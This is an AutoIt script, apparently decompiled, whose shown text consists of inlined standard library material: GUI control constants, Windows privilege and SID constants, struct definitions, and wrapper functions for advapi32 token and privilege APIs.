#Region
	#AutoIt3Wrapper_Version=Beta
	#AutoIt3Wrapper_Icon=..\Icon\ico\Wi-Fi.ico
	#AutoIt3Wrapper_Compression=4
	#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
	#AutoIt3Wrapper_Res_LegalCopyright=Aces
	#AutoIt3Wrapper_AU3Check_Stop_OnWarning=y
	#AutoIt3Wrapper_Run_Tidy=y
#EndRegion
Global Const $dts_shortdateformat = 0
Global Const $dts_updown = 1
Global Const $dts_shownone = 2
Global Const $dts_longdateformat = 4
Global Const $dts_timeformat = 9
Global Const $dts_rightalign = 32
Global Const $dts_shortdatecenturyformat = 12
Global Const $dts_appcanparse = 16
Global Const $dmw_longname = 0
Global Const $dmw_shortname = 1
Global Const $dmw_locale_longname = 2
Global Const $dmw_locale_shortname = 3
Global Const $gdt_error = -1
Global Const $gdt_valid = 0
Global Const $gdt_none = 1
Global Const $gdtr_min = 1
Global Const $gdtr_max = 2
Global Const $mcht_nowhere = 0
Global Const $mcht_title = 65536
Global Const $mcht_calendar = 131072
Global Const $mcht_todaylink = 196608
Global Const $mcht_next = 16777216
Global Const $mcht_prev = 33554432
Global Const $mcht_titlebk = 65536
Global Const $mcht_titlemonth = 65537
Global Const $mcht_titleyear = 65538
Global Const $mcht_titlebtnnext = 16842755
Global Const $mcht_titlebtnprev = 33619971
Global Const $mcht_calendarbk = 131072
Global Const $mcht_calendardate = 131073
Global Const $mcht_calendarday = 131074
Global Const $mcht_calendarweeknum = 131075
Global Const $mcht_calendardatenext = 16908288
Global Const $mcht_calendardateprev = 33685504
Global Const $mcs_daystate = 1
Global Const $mcs_multiselect = 2
Global Const $mcs_weeknumbers = 4
Global Const $mcs_notodaycircle = 8
Global Const $mcs_notoday = 16
Global Const $mcs_notrailingdates = 64
Global Const $mcs_shortdaysofweek = 128
Global Const $mcs_noselchangeonnav = 256
Global Const $mcm_first = 4096
Global Const $mcm_getcalendarborder = ($mcm_first + 31)
Global Const $mcm_getcalendarcount = ($mcm_first + 23)
Global Const $mcm_getcalendargridinfo = ($mcm_first + 24)
Global Const $mcm_getcalid = ($mcm_first + 27)
Global Const $mcm_getcolor = ($mcm_first + 11)
Global Const $mcm_getcurrentview = ($mcm_first + 22)
Global Const $mcm_getcursel = ($mcm_first + 1)
Global Const $mcm_getfirstdayofweek = ($mcm_first + 16)
Global Const $mcm_getmaxselcount = ($mcm_first + 3)
Global Const $mcm_getmaxtodaywidth = ($mcm_first + 21)
Global Const $mcm_getminreqrect = ($mcm_first + 9)
Global Const $mcm_getmonthdelta = ($mcm_first + 19)
Global Const $mcm_getmonthrange = ($mcm_first + 7)
Global Const $mcm_getrange = ($mcm_first + 17)
Global Const $mcm_getselrange = ($mcm_first + 5)
Global Const $mcm_gettoday = ($mcm_first + 13)
Global Const $mcm_getunicodeformat = 8192 + 6
Global Const $mcm_hittest = ($mcm_first + 14)
Global Const $mcm_setcalendarborder = ($mcm_first + 30)
Global Const $mcm_setcalid = ($mcm_first + 28)
Global Const $mcm_setcolor = ($mcm_first + 10)
Global Const $mcm_setcurrentview = ($mcm_first + 32)
Global Const $mcm_setcursel = ($mcm_first + 2)
Global Const $mcm_setdaystate = ($mcm_first + 8)
Global Const $mcm_setfirstdayofweek = ($mcm_first + 15)
Global Const $mcm_setmaxselcount = ($mcm_first + 4)
Global Const $mcm_setmonthdelta = ($mcm_first + 20)
Global Const $mcm_setrange = ($mcm_first + 18)
Global Const $mcm_setselrange = ($mcm_first + 6)
Global Const $mcm_settoday = ($mcm_first + 12)
Global Const $mcm_setunicodeformat = 8192 + 5
Global Const $mcm_sizerecttomin = ($mcm_first + 29)
Global Const $mcn_first = -746
Global Const $mcn_selchange = ($mcn_first - 3)
Global Const $mcn_getdaystate = ($mcn_first - 1)
Global Const $mcn_select = ($mcn_first)
Global Const $mcn_viewchange = ($mcn_first - 4)
Global Const $mcsc_background = 0
Global Const $mcsc_monthbk = 4
Global Const $mcsc_text = 1
Global Const $mcsc_titlebk = 2
Global Const $mcsc_titletext = 3
Global Const $mcsc_trailingtext = 5
Global Const $dtm_first = 4096
Global Const $dtm_getsystemtime = $dtm_first + 1
Global Const $dtm_setsystemtime = $dtm_first + 2
Global Const $dtm_getrange = $dtm_first + 3
Global Const $dtm_setrange = $dtm_first + 4
Global Const $dtm_setformat = $dtm_first + 5
Global Const $dtm_setmccolor = $dtm_first + 6
Global Const $dtm_getmccolor = $dtm_first + 7
Global Const $dtm_getmonthcal = $dtm_first + 8
Global Const $dtm_setmcfont = $dtm_first + 9
Global Const $dtm_getmcfont = $dtm_first + 10
Global Const $dtm_setformatw = $dtm_first + 50
Global Const $dtn_first = -740
Global Const $dtn_first2 = -753
Global Const $dtn_datetimechange = $dtn_first2 - 6
Global Const $dtn_userstring = $dtn_first2 - 5
Global Const $dtn_wmkeydown = $dtn_first2 - 4
Global Const $dtn_format = $dtn_first2 - 3
Global Const $dtn_formatquery = $dtn_first2 - 2
Global Const $dtn_dropdown = $dtn_first2 - 1
Global Const $dtn_closeup = $dtn_first2 + 0
Global Const $dtn_userstringw = $dtn_first - 5
Global Const $dtn_wmkeydownw = $dtn_first - 4
Global Const $dtn_formatw = $dtn_first - 3
Global Const $dtn_formatqueryw = $dtn_first - 2
Global Const $gui_ss_default_date = $dts_longdateformat
Global Const $gui_ss_default_monthcal = 0
Global Const $gmem_fixed = 0
Global Const $gmem_moveable = 2
Global Const $gmem_nocompact = 16
Global Const $gmem_nodiscard = 32
Global Const $gmem_zeroinit = 64
Global Const $gmem_modify = 128
Global Const $gmem_discardable = 256
Global Const $gmem_not_banked = 4096
Global Const $gmem_share = 8192
Global Const $gmem_ddeshare = 8192
Global Const $gmem_notify = 16384
Global Const $gmem_lower = 4096
Global Const $gmem_valid_flags = 32626
Global Const $gmem_invalid_handle = 32768
Global Const $gptr = BitOR($gmem_fixed, $gmem_zeroinit)
Global Const $ghnd = BitOR($gmem_moveable, $gmem_zeroinit)
Global Const $mem_commit = 4096
Global Const $mem_reserve = 8192
Global Const $mem_top_down = 1048576
Global Const $mem_shared = 134217728
Global Const $page_noaccess = 1
Global Const $page_readonly = 2
Global Const $page_readwrite = 4
Global Const $page_execute = 16
Global Const $page_execute_read = 32
Global Const $page_execute_readwrite = 64
Global Const $page_execute_writecopy = 128
Global Const $page_guard = 256
Global Const $page_nocache = 512
Global Const $page_writecombine = 1024
Global Const $page_writecopy = 8
Global Const $mem_decommit = 16384
Global Const $mem_release = 32768
Global Const $process_terminate = 1
Global Const $process_create_thread = 2
Global Const $process_set_sessionid = 4
Global Const $process_vm_operation = 8
Global Const $process_vm_read = 16
Global Const $process_vm_write = 32
Global Const $process_dup_handle = 64
Global Const $process_create_process = 128
Global Const $process_set_quota = 256
Global Const $process_set_information = 512
Global Const $process_query_information = 1024
Global Const $process_query_limited_information = 4096
Global Const $process_suspend_resume = 2048
Global Const $process_all_access = 2035711
Global Const $se_assignprimarytoken_name = "SeAssignPrimaryTokenPrivilege"
Global Const $se_audit_name = "SeAuditPrivilege"
Global Const $se_backup_name = "SeBackupPrivilege"
Global Const $se_change_notify_name = "SeChangeNotifyPrivilege"
Global Const $se_create_global_name = "SeCreateGlobalPrivilege"
Global Const $se_create_pagefile_name = "SeCreatePagefilePrivilege"
Global Const $se_create_permanent_name = "SeCreatePermanentPrivilege"
Global Const $se_create_symbolic_link_name = "SeCreateSymbolicLinkPrivilege"
Global Const $se_create_token_name = "SeCreateTokenPrivilege"
Global Const $se_debug_name = "SeDebugPrivilege"
Global Const $se_enable_delegation_name = "SeEnableDelegationPrivilege"
Global Const $se_impersonate_name = "SeImpersonatePrivilege"
Global Const $se_inc_base_priority_name = "SeIncreaseBasePriorityPrivilege"
Global Const $se_inc_working_set_name = "SeIncreaseWorkingSetPrivilege"
Global Const $se_increase_quota_name = "SeIncreaseQuotaPrivilege"
Global Const $se_load_driver_name = "SeLoadDriverPrivilege"
Global Const $se_lock_memory_name = "SeLockMemoryPrivilege"
Global Const $se_machine_account_name = "SeMachineAccountPrivilege"
Global Const $se_manage_volume_name = "SeManageVolumePrivilege"
Global Const $se_prof_single_process_name = "SeProfileSingleProcessPrivilege"
Global Const $se_relabel_name = "SeRelabelPrivilege"
Global Const $se_remote_shutdown_name = "SeRemoteShutdownPrivilege"
Global Const $se_restore_name = "SeRestorePrivilege"
Global Const $se_security_name = "SeSecurityPrivilege"
Global Const $se_shutdown_name = "SeShutdownPrivilege"
Global Const $se_sync_agent_name = "SeSyncAgentPrivilege"
Global Const $se_system_environment_name = "SeSystemEnvironmentPrivilege"
Global Const $se_system_profile_name = "SeSystemProfilePrivilege"
Global Const $se_systemtime_name = "SeSystemtimePrivilege"
Global Const $se_take_ownership_name = "SeTakeOwnershipPrivilege"
Global Const $se_tcb_name = "SeTcbPrivilege"
Global Const $se_time_zone_name = "SeTimeZonePrivilege"
Global Const $se_trusted_credman_access_name = "SeTrustedCredManAccessPrivilege"
Global Const $se_unsolicited_input_name = "SeUnsolicitedInputPrivilege"
Global Const $se_undock_name = "SeUndockPrivilege"
Global Const $se_privilege_enabled_by_default = 1
Global Const $se_privilege_enabled = 2
Global Const $se_privilege_removed = 4
Global Const $se_privilege_used_for_access = -2147483648
Global Const $se_group_mandatory = 1
Global Const $se_group_enabled_by_default = 2
Global Const $se_group_enabled = 4
Global Const $se_group_owner = 8
Global Const $se_group_use_for_deny_only = 16
Global Const $se_group_integrity = 32
Global Const $se_group_integrity_enabled = 64
Global Const $se_group_resource = 536870912
Global Const $se_group_logon_id = -1073741824
Global Enum $tokenprimary = 1, $tokenimpersonation
Global Enum $securityanonymous = 0, $securityidentification, $securityimpersonation, $securitydelegation
Global Enum $tokenuser = 1, $tokengroups, $tokenprivileges, $tokenowner, $tokenprimarygroup, $tokendefaultdacl, $tokensource, $tokentype, $tokenimpersonationlevel, $tokenstatistics, $tokenrestrictedsids, $tokensessionid, $tokengroupsandprivileges, $tokensessionreference, $tokensandboxinert, $tokenauditpolicy, $tokenorigin, $tokenelevationtype, $tokenlinkedtoken, $tokenelevation, $tokenhasrestrictions, $tokenaccessinformation, $tokenvirtualizationallowed, $tokenvirtualizationenabled, $tokenintegritylevel, $tokenuiaccess, $tokenmandatorypolicy, $tokenlogonsid
Global Const $token_assign_primary = 1
Global Const $token_duplicate = 2
Global Const $token_impersonate = 4
Global Const $token_query = 8
Global Const $token_query_source = 16
Global Const $token_adjust_privileges = 32
Global Const $token_adjust_groups = 64
Global Const $token_adjust_default = 128
Global Const $token_adjust_sessionid = 256
Global Const $token_all_access = 983551
Global Const $token_read = 131080
Global Const $token_write = 131296
Global Const $token_execute = 131072
Global Const $token_has_traverse_privilege = 1
Global Const $token_has_backup_privilege = 2
Global Const $token_has_restore_privilege = 4
Global Const $token_has_admin_group = 8
Global Const $token_is_restricted = 16
Global Const $token_session_not_referenced = 32
Global Const $token_sandbox_inert = 64
Global Const $token_has_impersonate_privilege = 128
Global Const $rights_delete = 65536
Global Const $read_control = 131072
Global Const $write_dac = 262144
Global Const $write_owner = 524288
Global Const $synchronize = 1048576
Global Const $access_system_security = 16777216
Global Const $standard_rights_required = 983040
Global Const $standard_rights_read = $read_control
Global Const $standard_rights_write = $read_control
Global Const $standard_rights_execute = $read_control
Global Const $standard_rights_all = 2031616
Global Const $specific_rights_all = 65535
Global Enum $not_used_access = 0, $grant_access, $set_access, $deny_access, $revoke_access, $set_audit_success, $set_audit_failure
Global Enum $trustee_is_unknown = 0, $trustee_is_user, $trustee_is_group, $trustee_is_domain, $trustee_is_alias, $trustee_is_well_known_group, $trustee_is_deleted, $trustee_is_invalid, $trustee_is_computer
Global Const $logon_with_profile = 1
Global Const $logon_netcredentials_only = 2
Global Enum $sidtypeuser = 1, $sidtypegroup, $sidtypedomain, $sidtypealias, $sidtypewellknowngroup, $sidtypedeletedaccount, $sidtypeinvalid, $sidtypeunknown, $sidtypecomputer, $sidtypelabel
Global Const $sid_administrators = "S-1-5-32-544"
Global Const $sid_users = "S-1-5-32-545"
Global Const $sid_guests = "S-1-5-32-546"
Global Const $sid_account_operators = "S-1-5-32-548"
Global Const $sid_server_operators = "S-1-5-32-549"
Global Const $sid_print_operators = "S-1-5-32-550"
Global Const $sid_backup_operators = "S-1-5-32-551"
Global Const $sid_replicator = "S-1-5-32-552"
Global Const $sid_owner = "S-1-3-0"
Global Const $sid_everyone = "S-1-1-0"
Global Const $sid_network = "S-1-5-2"
Global Const $sid_interactive = "S-1-5-4"
Global Const $sid_system = "S-1-5-18"
Global Const $sid_authenticated_users = "S-1-5-11"
Global Const $sid_schannel_authentication = "S-1-5-64-14"
Global Const $sid_digest_authentication = "S-1-5-64-21"
Global Const $sid_nt_service = "S-1-5-80"
Global Const $sid_untrusted_mandatory_level = "S-1-16-0"
Global Const $sid_low_mandatory_level = "S-1-16-4096"
Global Const $sid_medium_mandatory_level = "S-1-16-8192"
Global Const $sid_medium_plus_mandatory_level = "S-1-16-8448"
Global Const $sid_high_mandatory_level = "S-1-16-12288"
Global Const $sid_system_mandatory_level = "S-1-16-16384"
Global Const $sid_protected_process_mandatory_level = "S-1-16-20480"
Global Const $sid_secure_process_mandatory_level = "S-1-16-28672"
Global Const $sid_all_services = "S-1-5-80-0"

Func _winapi_getlasterror($ierror = @error, $iextended = @extended)
	Local $aresult = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($ierror, $iextended, $aresult[0])
EndFunc

Func _winapi_setlasterror($ierrorcode, $ierror = @error, $iextended = @extended)
	DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
	Return SetError($ierror, $iextended, NULL )
EndFunc

Func _security__adjusttokenprivileges($htoken, $bdisableall, $pnewstate, $ibufferlen, $pprevstate = 0, $prequired = 0)
	Local $acall = DllCall("advapi32.dll", "bool", "AdjustTokenPrivileges", "handle", $htoken, "bool", $bdisableall, "struct*", $pnewstate, "dword", $ibufferlen, "struct*", $pprevstate, "struct*", $prequired)
	If @error Then Return SetError(@error, @extended, False)
	Return NOT ($acall[0] = 0)
EndFunc

Func _security__createprocesswithtoken($htoken, $ilogonflags, $scommandline, $icreationflags, $scurdir, $tstartupinfo, $tprocess_information)
	Local $acall = DllCall("advapi32.dll", "bool", "CreateProcessWithTokenW", "handle", $htoken, "dword", $ilogonflags, "ptr", 0, "wstr", $scommandline, "dword", $icreationflags, "struct*", 0, "wstr", $scurdir, "struct*", $tstartupinfo, "struct*", $tprocess_information)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, False)
	Return True
EndFunc

Func _security__duplicatetokenex($hexistingtoken, $idesiredaccess, $iimpersonationlevel, $itokentype)
	Local $acall = DllCall("advapi32.dll", "bool", "DuplicateTokenEx", "handle", $hexistingtoken, "dword", $idesiredaccess, "struct*", 0, "int", $iimpersonationlevel, "int", $itokentype, "handle*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Return $acall[6]
EndFunc

Func _security__getaccountsid($saccount, $ssystem = "")
	Local $aacct = _security__lookupaccountname($saccount, $ssystem)
	If @error Then Return SetError(@error, @extended, 0)
	If IsArray($aacct) Then Return _security__stringsidtosid($aacct[0])
	Return ""
EndFunc

Func _security__getlengthsid($psid)
	If NOT _security__isvalidsid($psid) Then Return SetError(@error + 10, @extended, 0)
	Local $acall = DllCall("advapi32.dll", "dword", "GetLengthSid", "struct*", $psid)
	If @error Then Return SetError(@error, @extended, 0)
	Return $acall[0]
EndFunc

Func _security__gettokeninformation($htoken, $iclass)
	Local $acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", 0, "dword", 0, "dword*", 0)
	If @error OR NOT $acall[5] Then Return SetError(@error + 10, @extended, 0)
	Local $ilen = $acall[5]
	Local $tbuffer = DllStructCreate("byte[" & $ilen & "]")
	$acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", $tbuffer, "dword", DllStructGetSize($tbuffer), "dword*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Return $tbuffer
EndFunc

Func _security__impersonateself($ilevel = $securityimpersonation)
	Local $acall = DllCall("advapi32.dll", "bool", "ImpersonateSelf", "int", $ilevel)
	If @error Then Return SetError(@error, @extended, False)
	Return NOT ($acall[0] = 0)
EndFunc

Func _security__isvalidsid($psid)
	Local $acall = DllCall("advapi32.dll", "bool", "IsValidSid", "struct*", $psid)
	If @error Then Return SetError(@error, @extended, False)
	Return NOT ($acall[0] = 0)
EndFunc

Func _security__lookupaccountname($saccount, $ssystem = "")
	Local $tdata = DllStructCreate("byte SID[256]")
	Local $acall = DllCall("advapi32.dll", "bool", "LookupAccountNameW", "wstr", $ssystem, "wstr", $saccount, "struct*", $tdata, "dword*", DllStructGetSize($tdata), "wstr", "", "dword*", DllStructGetSize($tdata), "int*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Local $aacct[3]
	$aacct[0] = _security__sidtostringsid(DllStructGetPtr($tdata, "SID"))
	$aacct[1] = $acall[5]
	$aacct[2] = $acall[7]
	Return $aacct
EndFunc

Func _security__lookupaccountsid($vsid, $ssystem = "")
	Local $psid, $aacct[3]
	If IsString($vsid) Then
		$psid = _security__stringsidtosid($vsid)
	Else
		$psid = $vsid
	EndIf
	If NOT _security__isvalidsid($psid) Then Return SetError(@error + 10, @extended, 0)
	Local $stypesystem = "ptr"
	If $ssystem Then $stypesystem = "wstr"
	Local $acall = DllCall("advapi32.dll", "bool", "LookupAccountSidW", $stypesystem, $ssystem, "struct*", $psid, "wstr", "", "dword*", 65536, "wstr", "", "dword*", 65536, "int*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Local $aacct[3]
	$aacct[0] = $acall[3]
	$aacct[1] = $acall[5]
	$aacct[2] = $acall[7]
	Return $aacct
EndFunc

Func _security__lookupprivilegevalue($ssystem, $sname)
	Local $acall = DllCall("advapi32.dll", "bool", "LookupPrivilegeValueW", "wstr", $ssystem, "wstr", $sname, "int64*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Return $acall[3]
EndFunc

Func _security__openprocesstoken($hprocess, $iaccess)
	Local $acall = DllCall("advapi32.dll", "bool", "OpenProcessToken", "handle", $hprocess, "dword", $iaccess, "handle*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Return $acall[3]
EndFunc

Func _security__openthreadtoken($iaccess, $hthread = 0, $bopenasself = False)
	If $hthread = 0 Then
		Local $aresult = DllCall("kernel32.dll", "handle", "GetCurrentThread")
		If @error Then Return SetError(@error + 10, @extended, 0)
		$hthread = $aresult[0]
	EndIf
	Local $acall = DllCall("advapi32.dll", "bool", "OpenThreadToken", "handle", $hthread, "dword", $iaccess, "bool", $bopenasself, "handle*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Return $acall[4]
EndFunc

Func _security__openthreadtokenex($iaccess, $hthread = 0, $bopenasself = False)
	Local $htoken = _security__openthreadtoken($iaccess, $hthread, $bopenasself)
	If $htoken = 0 Then
		Local Const $error_no_token = 1008
		If _winapi_getlasterror() <> $error_no_token Then Return SetError(20, _winapi_getlasterror(), 0)
		If NOT _security__impersonateself() Then Return SetError(@error + 10, _winapi_getlasterror(), 0)
		$htoken = _security__openthreadtoken($iaccess, $hthread, $bopenasself)
		If $htoken = 0 Then Return SetError(@error, _winapi_getlasterror(), 0)
	EndIf
	Return $htoken
EndFunc

Func _security__setprivilege($htoken, $sprivilege, $benable)
	Local $iluid = _security__lookupprivilegevalue("", $sprivilege)
	If $iluid = 0 Then Return SetError(@error + 10, @extended, False)
	Local Const $tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
	Local $tcurrstate = DllStructCreate($tagtoken_privileges)
	Local $icurrstate = DllStructGetSize($tcurrstate)
	Local $tprevstate = DllStructCreate($tagtoken_privileges)
	Local $iprevstate = DllStructGetSize($tprevstate)
	Local $trequired = DllStructCreate("int Data")
	DllStructSetData($tcurrstate, "Count", 1)
	DllStructSetData($tcurrstate, "LUID", $iluid)
	If NOT _security__adjusttokenprivileges($htoken, False, $tcurrstate, $icurrstate, $tprevstate, $trequired) Then Return SetError(2, @error, False)
	DllStructSetData($tprevstate, "Count", 1)
	DllStructSetData($tprevstate, "LUID", $iluid)
	Local $iattributes = DllStructGetData($tprevstate, "Attributes")
	If $benable Then
		$iattributes = BitOR($iattributes, $se_privilege_enabled)
	Else
		$iattributes = BitAND($iattributes, BitNOT($se_privilege_enabled))
	EndIf
	DllStructSetData($tprevstate, "Attributes", $iattributes)
	If NOT _security__adjusttokenprivileges($htoken, False, $tprevstate, $iprevstate, $tcurrstate, $trequired) Then Return SetError(3, @error, False)
	Return True
EndFunc

Func _security__settokeninformation($htoken, $itokeninformation, $vtokeninformation, $itokeninformationlength)
	Local $acall = DllCall("advapi32.dll", "bool", "SetTokenInformation", "handle", $htoken, "int", $itokeninformation, "struct*", $vtokeninformation, "dword", $itokeninformationlength)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, False)
	Return True
EndFunc

Func _security__sidtostringsid($psid)
	If NOT _security__isvalidsid($psid) Then Return SetError(@error + 10, 0, "")
	Local $acall = DllCall("advapi32.dll", "bool", "ConvertSidToStringSidW", "struct*", $psid, "ptr*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, "")
	Local $pstringsid = $acall[2]
	Local $alen = DllCall("kernel32.dll", "int", "lstrlenW", "struct*", $pstringsid)
	Local $ssid = DllStructGetData(DllStructCreate("wchar Text[" & $alen[0] + 1 & "]", $pstringsid), "Text")
	DllCall("kernel32.dll", "handle", "LocalFree", "handle", $pstringsid)
	Return $ssid
EndFunc

Func _security__sidtypestr($itype)
	Switch $itype
		Case $sidtypeuser
			Return "User"
		Case $sidtypegroup
			Return "Group"
		Case $sidtypedomain
			Return "Domain"
		Case $sidtypealias
			Return "Alias"
		Case $sidtypewellknowngroup
			Return "Well Known Group"
		Case $sidtypedeletedaccount
			Return "Deleted Account"
		Case $sidtypeinvalid
			Return "Invalid"
		Case $sidtypeunknown
			Return "Unknown Type"
		Case $sidtypecomputer
			Return "Computer"
		Case $sidtypelabel
			Return "A mandatory integrity label SID"
		Case Else
			Return "Unknown SID Type"
	EndSwitch
EndFunc

Func _security__stringsidtosid($ssid)
	Local $acall = DllCall("advapi32.dll", "bool", "ConvertStringSidToSidW", "wstr", $ssid, "ptr*", 0)
	If @error OR NOT $acall[0] Then Return SetError(@error, @extended, 0)
	Local $psid = $acall[2]
	Local $tbuffer = DllStructCreate("byte Data[" & _security__getlengthsid($psid) & "]", $psid)
	Local $tsid = DllStructCreate("byte Data[" & DllStructGetSize($tbuffer) & "]")
	DllStructSetData($tsid, "Data", DllStructGetData($tbuffer, "Data"))
	DllCall("kernel32.dll", "handle", "LocalFree", "handle", $psid)
	Return $tsid
EndFunc

Global Const $tagpoint = "struct;long X;long Y;endstruct"
Global Const $tagrect = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $tagsize = "struct;long X;long Y;endstruct"
Global Const $tagmargins = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $tagfiletime = "struct;dword Lo;dword Hi;endstruct"
Global Const $tagsystemtime = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $tagtime_zone_information = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $tagcomboboxexitem = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $tagnmcbedragbegin = $tagnmhdr & ";int ItemID;wchar szText[260]"
Global Const $tagnmcbeendedit = $tagnmhdr & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $tagnmcomboboxex = $tagnmhdr & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $tagdtprange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $tagnmdatetimechange = $tagnmhdr & ";dword Flag;" & $tagsystemtime
Global Const $tagnmdatetimeformat = $tagnmhdr & ";ptr Format;" & $tagsystemtime & ";ptr pDisplay;wchar Display[64]"
Global Const $tagnmdatetimeformatquery = $tagnmhdr & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $tagnmdatetimekeydown = $tagnmhdr & ";int VirtKey;ptr Format;" & $tagsystemtime
Global Const $tagnmdatetimestring = $tagnmhdr & ";ptr UserString;" & $tagsystemtime & ";dword Flags"
Global Const $tageventlogrecord = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $taggdip_effectparams_blur = "float Radius; bool ExpandEdge"
Global Const $taggdip_effectparams_brightnesscontrast = "int BrightnessLevel; int ContrastLevel"
Global Const $taggdip_effectparams_colorbalance = "int CyanRed; int MagentaGreen; int YellowBlue"
Global Const $taggdip_effectparams_colorcurve = "int Adjustment; int Channel; int AdjustValue"
Global Const $taggdip_effectparams_colorlut = "byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
Global Const $taggdip_effectparams_huesaturationlightness = "int HueLevel; int SaturationLevel; int LightnessLevel"
Global Const $taggdip_effectparams_levels = "int Highlight; int Midtone; int Shadow"
Global Const $taggdip_effectparams_redeyecorrection = "uint NumberOfAreas; ptr Areas"
Global Const $taggdip_effectparams_sharpen = "float Radius; float Amount"
Global Const $taggdip_effectparams_tint = "int Hue; int Amount"
Global Const $taggdipbitmapdata = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $taggdipcolormatrix = "float m[25]"
Global Const $taggdipencoderparam = "struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
Global Const $taggdipencoderparams = "uint Count;" & $taggdipencoderparam
Global Const $taggdiprectf = "struct;float X;float Y;float Width;float Height;endstruct"
Global Const $taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $taggdipstartupoutput = "ptr HookProc;ptr UnhookProc"
Global Const $taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $taggdippencoderparams = "uint Count;byte Params[1]"
Global Const $taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $tagnmhddispinfo = $tagnmhdr & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $tagnmhdfilterbtnclick = $tagnmhdr & ";int Item;" & $tagrect
Global Const $tagnmheader = $tagnmhdr & ";int Item;int Button;ptr pItem"
Global Const $taggetipaddress = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $tagnmipaddress = $tagnmhdr & ";int Field;int Value"
Global Const $taglvfindinfo = "struct;uint Flags;ptr Text;lparam Param;" & $tagpoint & ";uint Direction;endstruct"
Global Const $taglvhittestinfo = $tagpoint & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $tagnmlistview = $tagnmhdr & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $tagnmlvcustomdraw = "struct;" & $tagnmhdr & ";dword dwDrawStage;handle hdc;" & $tagrect & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartId;int iStateId;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $tagnmlvdispinfo = $tagnmhdr & ";" & $taglvitem
Global Const $tagnmlvfinditem = $tagnmhdr & ";int Start;" & $taglvfindinfo
Global Const $tagnmlvgetinfotip = $tagnmhdr & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $tagnmitemactivate = $tagnmhdr & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $tagpoint & ";lparam lParam;uint KeyFlags"
Global Const $tagnmlvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmlvscroll = $tagnmhdr & ";int DX;int DY"
Global Const $tagmchittestinfo = "uint Size;" & $tagpoint & ";uint Hit;" & $tagsystemtime & ";" & $tagrect & ";int iOffset;int iRow;int iCol"
Global Const $tagmcmonthrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
